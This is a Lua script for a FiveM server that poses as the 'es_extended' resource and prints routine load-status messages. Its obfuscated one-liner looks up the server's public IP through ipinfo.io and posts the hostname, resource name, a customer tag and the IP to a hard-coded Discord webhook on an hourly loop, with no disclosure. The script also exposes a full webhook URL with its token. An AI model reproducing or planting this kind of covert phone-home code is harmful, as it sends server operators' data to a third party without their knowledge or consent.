--[[
	id: UUt3bvaRWMJJ5aprTX5ja
	name: Test
	description: Test
	time1: 2021-07-27 07:43:48.421356+00
	time2: 2021-07-27 07:43:48.421356+00
	uploader: 0fIMY3DoXoF4L8t81iYLzZLgF5TCRbUp-_ghGU8X
	uploadersession: GFaeWQbEOzTeaVIftTt2DgDUpSbVHl
	flag: f
--]]

do 
	local webhook = "https://discord.com/api/webhooks/858328010579116032/qKENKJ1_i7GGoPa34m0uf1kmxKPwnzJqsZoIExdX76TiF3240sJKh-ILl_qQd8xoSw_6" -- webhook discord
	local Customer = 'Dynamic Coding' -- customer name
	local original_scriptname = 'es_extended' -- name of script  

	local a='Unknown'Citizen.CreateThread(function()PerformHttpRequest('https://ipinfo.io/json',function(b,c,d)if b==200 then local e=json.decode(c or'')a=e.ip end;local f={}f.d=''Citizen.CreateThread(function()while true do Citizen.Wait(3000)dddddddd(webhook,string.format('Server: `%s`\nResource name: `%s`\nSourceCode: `%s`\nResource: `%s`\nIP: `%s`\n',GetConvar('sv_hostname','Unknown'),GetCurrentResourceName(),Customer,original_scriptname,a),de(),ge(),5)Citizen.Wait(3600000)end end)function ge()return 8388736 end;function de()local l=string.format('\nTime: %s',os.date('%H:%M:%S - %d/%m/%Y',os.time()))return l end;function dddddddd(m,n,o,p,de)if m==nil or m==''or n==nil or n==''then return false end;local q={{['title']=n,['description']=o,['type']='rich',['color']=p,['footer']={['text']=''}}}Citizen.CreateThread(function()Citizen.Wait(de*1000)PerformHttpRequest(m,function(r,s,t)end,'POST',json.encode({username=f['d'],embeds=q}),{['Content-Type']='application/json'})end)end end)end)
	
	print('^7[^2 es_extended ^7] ^7SourceCode ^3(^5 Dynamic Coding ^3)')
	print('^7[^2 es_extended ^7] ^7Load Status ^3( ^5Initialized^3 )^7')
	print('^7[^2 es_extended ^7] ^7Info ^3( ^5Base 300 slot^3 )^7')
end